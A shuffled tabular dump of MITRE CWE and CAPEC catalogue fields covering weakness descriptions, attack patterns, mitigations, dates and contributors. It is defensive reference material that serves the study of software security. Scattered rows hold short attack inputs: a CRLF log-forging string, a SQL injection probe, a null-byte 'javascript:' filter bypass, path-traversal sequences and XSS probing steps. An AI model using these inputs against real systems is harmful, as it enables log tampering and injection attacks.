6405	27	None: No specialized resources are required to execute this type of attack. However, in most cases, the attacker will need to be a recognized user of the web-mail server.
22589	79	Access Control
21439	42	Perform extensive functionality testing of the UI. The UI should behave as specified.
24123	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
19872	85	244
15775	45	Variant
17667	28	Eric Dalci
22546	35	MITRE
22014	97	Design Alteration
17138	102	ChildOf
20023	47	Unreliable Execution
7962	26	Implementation
14384	79	Accountability
13621	73	Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).
15949	23	An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an attacker controlled source. Although there are several variations to this strategy of attack, the attack methods are united in that all rely on the ability of an attacker to position and disguise malicious content such that it masquerades as a legitimate software update which is then processed by a program, undermining application integrity. As such the attack employs 'spoofing' techniques augmented by psychological or technological mechanisms to disguise the update and/or its source. Virtually all software requires frequent updates or patches, giving the attacker immense latitude when structuring the attack, as well as many targets of opportunity. Attacks involving malicious software updates can be targeted or untargeted in reference to a population of users, and can also involve manual and automatic means of payload installation. Untargeted attacks rely upon a mass delivery system such as spamming, phishing, or trojans/botnets to distribute emails or other messages to vast populations of users. Targeted attacks aim at a particular demographic or user population. Corporate Facebook or Myspace pages make it easy to target users of a specific company or affiliation without relying on email address harvesting or spamming. One phishing-assisted variation on this attack involves hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update. This type of attack has also been conducted using an Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update. While both methods involve a high degree of automated mechanisms to support the attack, the primary vector for achieving the installation of the update remains a manual user-directed process, although clicking a link within an IM client or web application may initiate the update. Other class of attacks focus on firmware, where malicious updates are made to the core system firmware or BIOS. Since this occurs outside the controls of the operating system, the OS detection and prevention mechanisms do not aid, thus allowing an adversary to evade defenses as well as gain persistence on the target's system. Automated attacks involving malicious software updates require little to no user-directed activity and are therefore advantageous because they avoid the complex preliminary setup stages of manual attacks, which must effectively 'hook' users while avoiding countermeasures such as spam filters or web security filters.
11270	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
9183	56	ChildOf
9033	35	MITRE
23444	67	High
16973	40	RPC scanning requires no special privileges when it is performed via a native system utility.
15617	81	Integrity
13359	77	Dynamic Analysis with Automated Results Interpretation
24060	28	CWE Content Team
23115	31	1000
19384	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
16344	26	Architecture and Design
5609	35	MITRE
19918	101	CAPEC Content Team
24717	56	ChildOf
22420	74	5
20426	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
15348	39	2008-07-01
24389	69	Draft
8257	39	2010-12-13
18255	42	Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.                   Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.
11261	35	MITRE
10782	89	Standard
20741	63	Varies by Context
13509	63	DoS: Crash, Exit, or Restart
25308	47	Read Data
13452	28	Eric Dalci
18481	28	CWE Content Team
22458	62	updated Potential_Mitigations
6390	40	The victim's software must not differentiate between the location and type of reference passed the client software, e.g. browser
13890	31	1000
10547	62	updated Relationships
9918	28	CWE Content Team
22820	59	Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required
7501	48	09
14577	81	Confidentiality
11590	28	CWE Content Team
15639	35	MITRE
11897	40	The target software must consume files.
16541	80	Adversaries must be able to register DNS hostnames/URL’s.
23559	52	Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.                   Attach the monitor to the process and look for library functions and system calls that suggest when a search path is being used. One pattern is when the program performs multiple accesses of the same file but in different directories, with repeated failures until the proper filename is found. Library calls such as getenv() or their equivalent can be checked to see if any path-related variables are being accessed.
12738	39	2008-07-01
9471	39	2017-11-08
12332	42	Protect information stored in environment variable from being exposed to the user.
5700	28	CWE Content Team
15342	35	MITRE
8476	39	2008-09-08
9776	62	updated Applicable_Platforms
12098	35	MITRE
7118	91	Implementation
24247	66	Business Logic Flaws and Yahoo Games
12178	35	MITRE
25194	72	If the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code. If the corrupted memory is data rather than instructions, the system will continue to function with improper changes, possibly in violation of an implicit or explicit policy. The consequences would only be limited by how the affected data is used, such as an adjacent memory location that is used to specify whether the user has special privileges.
15257	35	MITRE
15020	28	CWE Content Team
18743	88	Improper Handling of File Names that Identify Virtual Resources
18018	88	Source Code File with Excessive Number of Lines of Code
13442	26	Implementation
6179	21	CWE Content Team
17477	76	2017-01-09
5757	26	Architecture and Design
10796	55	CAPEC Content Team
6457	85	300
7369	28	Eric Dalci
19914	101	CAPEC Content Team
15526	30	Jeremiah Grossman
8084	28	Eric Dalci
18859	46	In some instances, knowing when data is transmitted between parties can provide a malicious user with privileged information. Also, externally monitoring the timing of operations can potentially reveal sensitive data. For example, a cryptographic operation can expose its internal state if the time it takes to perform the operation varies, based on the state.             Covert channels are frequently classified as either storage or timing channels. Some examples of covert timing channels are the system's paging rate, the time a certain transaction requires to execute, and the time it takes to gain access to a shared bus.
21693	101	CAPEC Content Team
23378	66	Unforgivable Vulnerabilities
22151	69	Incomplete
12591	79	Access Control
11420	81	Confidentiality
8502	28	CWE Content Team
7629	33	U.S. Department of Human Services
24662	60	25
10019	56	ChildOf
23258	39	2008-09-08
8954	62	updated Relationships
13656	35	Cigital
20360	25	Medium
13969	62	updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
16019	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
16064	35	MITRE
24605	91	Implementation
19242	91	Architecture and Design
19481	62	updated Common_Consequences
20922	21	Landwehr
11289	104	608
13499	39	2008-09-08
15750	40	The targeted server must allow the attacker to insert content that will appear in the server's response.
23735	24	MITRE
22668	35	MITRE
12856	21	CWE Content Team
16607	81	Confidentiality
8372	39	2017-11-08
15574	35	MITRE
11579	23	An adversary with access to file system resources, either directly or via application logic, will use various file absolute paths and navigation mechanisms such as ".." to extend their range of access to inappropriate areas of the file system. The goal of the adversary is to access directories and files that are intended to be restricted from their access.
6453	72	If software relies on unique, unguessable IDs to identify a resource, an attacker might be able to guess an ID for a resource that is owned by another user. The attacker could then read the resource, or pre-create a resource with the same ID to prevent the legitimate program from properly sending the resource to the intended user. For example, a product might maintain session information in a file whose name is based on a username. An attacker could pre-create this file for a victim user, then set the permissions so that the application cannot generate the session for the victim, preventing the victim from using the application.
22652	62	updated Relationships, Taxonomy_Mappings
7247	35	MITRE
9941	81	Confidentiality
7685	103	Primary
19573	56	ChildOf
9208	62	updated Likelihood_of_Exploit, Taxonomy_Mappings
23550	74	1
14211	62	updated Name
19990	59	Updated Attacker_Skills_or_Knowledge_Required
11084	86	https://www.blackhat.com/presentations/bh-usa-07/Bulygin/Presentation/bh-usa-07-bulygin.pdf
15623	57	Primary
23438	31	1000
18938	31	1000
21151	35	Cigital
13133	78	Medium
12891	62	updated Time_of_Introduction
9321	39	2019-06-20
7133	33	Gabriel Lawrence
8660	28	CWE Content Team
10646	69	Draft
6970	102	ChildOf
22413	53	The MITRE Corporation
15481	104	173
8507	62	updated Potential_Mitigations, References
21034	42	Always specify output buffers large enough to handle the maximum-size possible result from path manipulation functions.
7302	35	MITRE
25130	35	MITRE
10875	63	Reduce Maintainability
23162	45	Base
16416	104	121
21266	35	MITRE
11031	47	Gain Privileges
18558	47	Bypass Protection Mechanism
9076	56	ChildOf
16913	60	20
18199	62	updated Common_Consequences
10230	100	The MITRE Corporation
22418	35	MITRE
7907	103	Primary
6352	102	ChildOf
6928	53	The MITRE Corporation
19370	28	CWE Content Team
13400	76	2015-11-09
19492	47	Modify Data
25128	43	Simple
8827	63	DoS: Crash, Exit, or Restart
12201	28	CWE Content Team
9958	39	2008-09-08
9406	28	CWE Content Team
20013	88	Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')
15820	56	ChildOf
20144	31	1000
16087	92	Exploit
22610	51	2014-06-23
15690	70	OWASP Testing Guide
13800	51	2014-06-23
16314	88	Authentication Bypass by Alternate Name
18898	73	Use a list of XSS probe strings to inject script into resources accessed by the application. If possible, the probe strings contain a unique identifier.
5826	55	CAPEC Content Team
6839	35	MITRE
16833	95	[Use malicious command delimiters] The attacker uses combinations of payload and carefully placed command delimiters to attack the software.
15440	35	MITRE
5634	88	Incorrect Conversion between Numeric Types
11483	39	2011-06-01
6652	23	A class contains an unnecessarily large number of      children.
8536	35	MITRE
22436	79	Confidentiality
13160	28	CWE Content Team
18110	80	This attack can be performed by low capability attackers with commercially available tools.
22948	70	Hardware Trojans: A Novel Attack Meets a New Defense
25360	51	2014-06-23
23220	85	606
21270	28	CWE Content Team
14093	56	ChildOf
10313	62	updated Relationships
11476	86	http://www.cs.cmu.edu/afs/cs/usr/wing/www/publications/ManadhataWing04.pdf
13083	100	The MITRE Corporation
24383	28	CWE Content Team
9845	45	Variant
11953	62	updated Related_Attack_Patterns
16296	56	PeerOf
17729	101	CAPEC Content Team
6656	86	http://software-security.sans.org/blog/2010/03/19/top-25-series-rank-18-incorrect-calculation-of-buffer-size
19041	85	19
10862	66	Information Leakage
18938	56	ChildOf
5738	59	Updated Related_Weaknesses
21692	40	The user's browser must have vulnerabilities in its implementation of the same-origin policy. It allows certain data in a loaded page to originate from different servers/domains.
17152	62	updated Related_Attack_Patterns
25358	28	CWE Content Team
9203	45	Base
16863	39	2012-05-11
24124	46	Non-reentrant functions are functions that cannot safely be called, interrupted, and then recalled before the first call has finished without resulting in memory corruption. This can lead to an unexpected system state an unpredictable results with a variety of potential consequences depending on context, including denial of service and code execution.             Many functions are not reentrant, but some of them can result in the corruption of memory if they are used in a signal handler. The function call syslog() is an example of this. In order to perform its functionality, it allocates a small amount of memory as "scratch space." If syslog() is suspended by a signal call and the signal handler calls syslog(), the memory used by both of these functions enters an undefined, and possibly, exploitable state. Implementations of malloc() and free() manage metadata in global structures in order to track which memory is allocated versus which memory is available, but they are non-reentrant. Simultaneous calls to these functions can cause corruption of the metadata.
19498	39	2011-06-01
18556	55	CAPEC Content Team
19881	39	2014-06-23
15767	42	Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) to enforce the roles at the appropriate boundaries.                   Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.
9826	35	MITRE
20315	35	MITRE
17928	43	Simple
17527	95	[Spider] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.
7995	104	1112
5944	103	Primary
8039	94	Cross Frame Scripting allows an adversary to steal sensitive data from a legitimate site.
6832	39	2012-05-11
17423	35	MITRE
18943	28	CWE Content Team
23727	57	Primary
11589	103	Primary
20843	31	1000
23196	62	updated Related_Attack_Patterns
13005	28	CWE Content Team
5998	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
17064	28	CWE Content Team
23586	28	CWE Content Team
23066	23	An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content. However, this attack differs from a Man-In-the-Middle (MITM) attack, as the adversary does not alter the content of the communications nor forward data to the intended recipient.
15373	28	CWE Content Team
11585	39	2011-06-01
8595	35	MITRE
12761	35	MITRE
25429	35	MITRE
19505	31	699
11182	23	This attack targets the encoding of the URL combined with the encoding of the slash characters. An attacker can take advantage of the multiple ways of encoding a URL and abuse the interpretation of the URL. A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc.
8218	45	Base
18925	62	updated Time_of_Introduction
16355	88	Same Seed in Pseudo-Random Number Generator (PRNG)
16078	28	CWE Content Team
17965	26	Operation
17077	45	Base
14616	56	ChildOf
23439	39	2011-03-29
24537	88	Class Instance Self Destruction Control Element
17517	28	CWE Content Team
13539	35	MITRE
15946	39	2014-07-30
19077	62	updated Related_Attack_Patterns, Relationships
8457	45	Variant
21901	62	updated Potential_Mitigations
15596	35	MITRE
5869	28	CWE Content Team
15696	62	updated References
24972	76	2019-09-30
13549	59	Updated Consequences
16974	62	updated Relationships, References, Taxonomy_Mappings
6412	51	2014-06-23
9047	28	CWE Content Team
17666	102	ChildOf
5723	76	2017-08-04
17737	62	updated Common_Consequences, Relationships
16812	62	updated Potential_Mitigations
24375	97	Security Software Footprinting
8215	62	updated Relationships
17864	28	Eric Dalci
12053	28	CWE Content Team
7153	35	MITRE
6707	100	The MITRE Corporation
20416	62	updated Related_Attack_Patterns
17956	81	Integrity
17764	35	MITRE
23010	35	MITRE
23322	74	1
8146	35	MITRE
24368	43	Simple
25288	46	In situations where functions return references to mutable data, it is possible that the external code which called the function may make changes to the data sent. If this data was not previously cloned, the class will then be using modified data which may violate assumptions about its internal state.
11217	74	1
25166	101	CAPEC Content Team
23622	46	It is easy for developers to forget to update validation logic when they make changes to an ActionForm class. One indication that validation logic is not being properly maintained is inconsistencies between the action form and the validation form.             Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
17274	35	MITRE
23724	103	Primary
24790	86	http://reports-archive.adm.cs.cmu.edu/anon/1998/CMU-CS-98-155.pdf
25218	102	ChildOf
13033	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis
17827	63	Modify Memory
20799	91	Architecture and Design
10301	28	Eric Dalci
13916	103	Primary
14768	39	2011-06-01
16544	73	The attacker attempts indirect and side channel access to targeted functions and data.
15047	39	2008-07-01
21585	62	updated Relationships
5718	42	Do not assume that a system administrator will manually change the configuration to the settings that are recommended in the software's manual.
19093	100	The MITRE Corporation
21282	62	updated Taxonomy_Mappings
11319	39	2008-10-14
6642	26	Implementation
17712	47	Hide Activities
23556	62	updated Other_Notes, Relationships
20455	39	2012-10-30
12124	31	1000
21221	73	Modify tokens arithmetically
21980	51	2014-06-23
11544	39	2011-06-01
14865	21	CWE Content Team
21163	35	Cigital
15065	90	Language-Independent
17991	63	Unexpected State
6920	26	Implementation
10857	88	Reversible One-Way Hash
23010	28	CWE Content Team
21407	21	PLOVER
12251	81	Confidentiality
8695	35	MITRE
19983	72	If an attacker can guess an authenticated user's session identifier, they can take over the user's session.
6676	44	SOAR Partial
12651	103	Primary
8494	62	updated Description
22834	39	2008-11-24
25356	28	CWE Content Team
20938	88	Partial String Comparison
14337	73	Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example:                   "%0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in"                   may add the following forged entry into a log file:                   "[Thu Nov 12 12:11:22]:Info: User admin logged in"                   Different applications may require different encodings of the carriage return and line feed characters.
14137	35	MITRE
15198	23	The software defines an IOCTL that uses METHOD_NEITHER for I/O, but it does not validate or incorrectly validates the addresses that are provided.
6601	91	Implementation
6955	28	CWE Content Team
15062	59	Updated References
12080	39	2008-07-01
23056	39	2011-06-01
8965	62	updated Relationships, Taxonomy_Mappings
12559	59	Updated Description
17164	28	CWE Content Team
23682	43	Simple
19895	40	The attacker must be able to write to redirect search paths on the victim host.
16171	35	MITRE
8977	35	MITRE
5958	35	MITRE
14487	91	Implementation
19393	92	Exploit
25048	62	updated Common_Consequences
6918	62	updated Relationships, Taxonomy_Mappings
15143	100	The MITRE Corporation
12437	77	Manual Static Analysis - Source Code
11774	79	Authorization
20209	62	Changed name and description to more clearly emphasize the "classic" nature of the overflow.
14361	101	CAPEC Content Team
18907	62	updated Applicable_Platforms
17505	62	updated References
21103	47	Modify Data
13550	97	Utilizing REST's Trust in the System Resource to Obtain Sensitive Data
18743	45	Base
8397	50	Employ a robust password policy for service accounts. Passwords should be of adequate length and complexity, and they should expire after a period of time.
14534	28	CWE Content Team
10005	39	2008-09-08
22332	39	2014-07-30
17803	50	Encrypt your communication using cryptography (SSL,...)
21651	39	2012-05-11
25232	79	Integrity
20305	76	2018-07-31
20640	81	Access Control
14710	62	updated Relationships
18699	31	699
8771	39	2008-07-01
12109	35	MITRE
8428	103	Primary
16870	102	CanFollow
11399	23	The product does not sufficiently compartmentalize functionality or processes that require different privilege levels, rights, or permissions.
8938	53	The MITRE Corporation
22228	35	MITRE
19766	76	2019-09-30
25334	57	Indirect
5703	54	Medium
24835	28	Eric Dalci
12539	40	Certification Authority is using the MD5 hash function to generate the certificate hash to be signed
15959	63	Read Application Data
8056	28	CWE Content Team
20300	28	CWE Content Team
22714	62	updated Demonstrative_Examples, Potential_Mitigations
11969	39	2012-05-11
23528	104	286
23722	23	An algorithm in a product has an inefficient worst-case computational complexity that may be detrimental to system performance and can be triggered by an attacker, typically using crafted manipulations that ensure that the worst case is being reached.
12637	78	Medium
16747	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
21238	50	Implementation: Only allow known URL to be included as remote flash movies in a flash application
20474	52	Automated static analysis tools may not be able to determine whether input influences the beginning of a URL, which is important for reducing false positives.
18404	44	SOAR Partial
16671	81	Availability
13019	39	2017-01-19
15071	76	2019-09-30
24111	62	updated Demonstrative_Examples
12022	73	The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message
11284	61	Draft
9685	62	updated Relationships
22259	28	CWE Content Team
12477	28	CWE Content Team
18998	100	The MITRE Corporation
24611	62	updated Potential_Mitigations
18892	35	MITRE
25407	39	2009-12-28
9144	51	2018-07-31
9057	21	PLOVER
16452	28	CWE Content Team
20221	28	CWE Content Team
11091	69	Draft
9051	62	updated Relationships, Taxonomy_Mappings
18654	35	MITRE
6576	77	Manual Analysis
11758	39	2011-03-29
7660	66	Race Conditions, Files, and Security Flaws; or the Tortoise and the Hare Redux
18273	28	CWE Content Team
13937	32	USENIX
22631	44	SOAR Partial
6194	56	ChildOf
22467	39	2011-06-01
17231	101	CAPEC Content Team
23291	62	updated Relationships, Taxonomy_Mappings
25203	39	2011-06-01
15720	56	ChildOf
12821	28	CWE Content Team
24182	62	updated Common_Consequences
15259	62	updated Common_Consequences
22544	35	MITRE
9571	45	Variant
5709	104	56
16816	39	2012-10-30
19299	89	Detailed
11373	62	updated Description, Name, Relationships
7093	32	The Wikimedia Foundation, Inc
14874	61	Draft
16163	95	[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.
23954	92	Exploit
6117	25	High
11330	28	CWE Content Team
7727	62	updated Relationships
14046	102	ChildOf
21323	28	CWE Content Team
25290	45	Variant
15530	79	Confidentiality
14901	39	2008-09-08
21253	97	XML External Entities Blowup
9626	89	Detailed
23152	35	MITRE
12398	46	Some web browsers may remove these sequences, resulting in output that may have unintended control implications. For example, the software may attempt to remove a "javascript:" URI scheme, but a "java%00script:" URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.
15823	47	Bypass Protection Mechanism
20463	81	Integrity
9461	103	Primary
10822	63	Execute Unauthorized Code or Commands
24681	62	updated Common_Consequences
10802	47	Gain Privileges
22201	21	PLOVER
23778	50	Implementation: DNSSEC
21237	103	Primary
8163	51	2014-06-23
14365	97	XML Flood
25054	46	The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: "An enterprise bean must not use the AWT functionality to attempt to output information to a display, or to input information from a keyboard." The specification justifies this requirement in the following way: "Most servers do not allow direct interaction between an application program and a keyboard/display attached to the server system."
5929	39	2014-06-23
14307	35	MITRE
19895	50	Design: Ensure that the program's compound parts, including all system dependencies, classpath, path, and so on, are secured to the same or higher level assurance as the program
21297	94	Run Arbitrary Code
7230	100	The MITRE Corporation
21399	62	updated Potential_Mitigations
19674	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
19576	28	CWE Content Team
24342	66	Remote Code with Expression Language Injection
16561	69	Incomplete
22904	31	1000
16176	42	Ensure that your code strictly conforms to specifications.
19183	39	2017-01-19
21848	81	Access Control
5770	90	C++
9934	61	Draft
7456	35	MITRE
6771	43	Simple
19952	23	The product does not have documentation that represents how it is designed.
11026	39	2009-03-10
17313	35	MITRE
12041	72	If hard-coded cryptographic keys are used, it is almost certain that malicious users will gain access through the account in question.
17815	62	updated Related_Attack_Patterns, Relationships
9841	27	None: No specialized resources are required to execute this type of attack.
23238	35	MITRE
8451	89	Detailed
11487	63	Bypass Protection Mechanism
10121	97	Exploitation of Trusted Credentials
10959	28	CWE Content Team
21843	25	Medium
10525	102	ChildOf
21833	35	MITRE
8788	80	To identify and execute against an over-privileged system interface
6805	28	CWE Content Team
20477	54	Low
19730	62	updated Applicable_Platforms, Description, Name, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
8488	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
9086	28	CWE Content Team
13477	28	CWE Content Team
13550	85	57
11212	45	Base
13805	39	2008-07-01
10604	39	2008-10-14
19966	35	MITRE
22078	21	PLOVER
25316	39	2011-06-01
20068	35	MITRE
24122	69	Draft
12978	78	High
23727	23	When multiple sockets are allowed to bind to the same port, other services on that port may be stolen or spoofed.
11317	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.                   Automated static analysis generally does not account for environmental considerations when reporting potential errors in buffer calculations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.
10432	26	Operation
11055	89	Meta
16168	62	updated Potential_Mitigations
18034	62	updated Potential_Mitigations
16533	79	Integrity
8655	88	Uncaught Exception
24997	103	Primary
17195	62	updated Common_Consequences, Observed_Examples, Related_Attack_Patterns, Relationships
23394	73	Use published credentials to access system.
9842	46	As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.
24368	23	The software does not properly return control flow to the proper location after it has completed a task or detected an unusual condition.
7219	28	CWE Content Team
14121	62	updated Relationships
6731	39	2010-02-16
9096	56	CanPrecede
23276	39	2018-03-27
23320	28	Eric Dalci
14397	31	1000
9483	63	Hide Activities
14693	39	2014-06-23
6646	48	12
17683	54	High
19477	35	MITRE
8980	73	Use an automated tool to record all instances of user-controllable input used to contruct XPath queries.
23407	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
14929	39	2012-10-30
24678	86	https://msdn.microsoft.com/en-us/library/ms533046.aspx
7659	35	MITRE
13634	28	CWE Content Team
22093	76	2019-04-04
11987	104	379
23236	26	Architecture and Design
22799	62	updated Time_of_Introduction
16818	95	[Expand victory conditions] It is sometimes possible to expand victory conditions. For example, the attacker might not need to know the exact secret but simply needs a value that produces the same result using a one-way function. While doing this does not reduce the size of the search space, the presence of multiple victory conditions does reduce the likely amount of time that the attacker will need to explore the space before finding a workable value.
15760	39	2012-10-30
22982	31	1000
12196	75	This is not a perfect solution, since 100% accuracy and coverage are not feasible.
21482	62	updated Relationships
6119	28	Eric Dalci
22688	28	Eric Dalci
20252	39	2009-05-27
7027	104	526
8568	73	Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only)
24758	79	Integrity
18811	40	The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.
20585	47	Bypass Protection Mechanism
13313	61	Draft
18786	66	Why Eve and Mallory Love Android: An Analysis of Android SSL (In)Security
25317	101	CAPEC Content Team
6796	23	A software system that accepts path input in the form of trailing dot ('filedir.') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
13902	28	Eric Dalci
11767	35	MITRE
15994	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
6350	28	CWE Content Team
25191	28	CWE Content Team
12520	39	2008-09-08
10952	62	updated Relationships, Taxonomy_Mappings
17400	59	Updated Related_Weaknesses
11025	77	Architecture or Design Review
14695	69	Incomplete
21846	62	added/updated demonstrative examples
10317	79	Confidentiality
21906	39	2009-12-28
20151	39	2008-07-01
16399	35	MITRE
23145	53	The MITRE Corporation
21291	101	CAPEC Content Team
16327	69	Incomplete
17300	39	2008-11-24
14685	39	2009-05-27
14964	31	1000
6876	27	None: No specialized resources are required to execute this type of attack.
16255	39	2014-07-30
8345	54	Low
19120	35	MITRE
19047	104	58
15797	79	Access Control
11047	47	Execute Unauthorized Commands
20859	62	updated Relationships, Taxonomy_Mappings
21876	62	updated Applicable_Platforms, References
22425	28	CWE Content Team
23580	79	Authorization
20647	100	The MITRE Corporation
24766	62	updated Time_of_Introduction
20969	62	updated Relationships, Taxonomy_Mappings
22558	62	updated Common_Consequences
18134	62	updated Applicable_Platforms, Description, Modes_of_Introduction, Name, Relationships, Type
17688	21	PLOVER
18611	35	MITRE
16727	73	Manipulate file and its path by injecting relative path sequences (e.g. "../").
25154	42	Use synchronization when locking a resource.
22301	62	updated Demonstrative_Examples
24041	31	1000
23683	91	Architecture and Design
16271	62	updated Relationships
15263	72	Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy.
8724	91	Implementation
24000	28	CWE Content Team
10968	35	MITRE
11013	39	2010-12-13
7381	79	Integrity
11174	28	CWE Content Team
17605	88	J2EE Bad Practices: Use of System.exit()
5989	35	MITRE
13672	96	2010-01-18
6254	53	The MITRE Corporation
6449	56	ChildOf
7919	63	Varies by Context
13992	40	An adversary needs to know a username to target.
11653	33	James Vincent
24069	72	This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.
13945	62	updated Common_Consequences
25310	24	MITRE
21537	62	updated Potential_Mitigations
8715	86	http://www.troyhunt.com/2012/06/our-password-hashing-has-no-clothes.html
24785	91	Architecture and Design
10010	62	updated Description, Potential_Mitigations
19239	59	Updated Description Summary, Related_Attack_Patterns
22108	39	2011-06-01
6109	62	updated Detection_Factors
9147	51	2014-06-23
9875	56	ChildOf
18691	31	1000
14124	23	The software constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.
15865	28	CWE Content Team
17349	28	CWE Content Team
24373	30	T. Berners-Lee
8912	39	2011-06-01
18739	100	The MITRE Corporation
9059	88	Trojan Horse
10040	39	2011-06-01
13539	28	CWE Content Team
14689	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
6315	47	Hide Activities
7754	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
24255	35	MITRE
14704	104	177
19387	26	Implementation
19896	49	2000
16595	21	CLASP
14617	62	updated Modes_of_Introduction, Relationships
18087	28	CWE Content Team
19412	100	The MITRE Corporation
8765	80	The adversary must be able to obtain or develop, as well as place malicious software inside the target network/system.
13998	88	J2EE Bad Practices: Direct Use of Sockets
10274	36	http://en.wikipedia.org/wiki/Cryptanalysis
9378	56	PeerOf
21891	31	1000
20240	39	2010-09-27
18545	39	2017-01-19
9143	103	Primary
9294	46	Password management issues occur when a password is stored in plaintext in an application's properties or configuration file. Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource.
22489	47	Execute Unauthorized Commands
25060	42	Do not use dangerous functions such as gets. Look for their safe equivalent, which checks for the boundary.
9805	62	updated Potential_Mitigations
8915	39	2011-06-01
19789	66	Top 25 Series - Rank 6 - Reliance on Untrusted Inputs in a Security Decision
7988	28	CWE Content Team
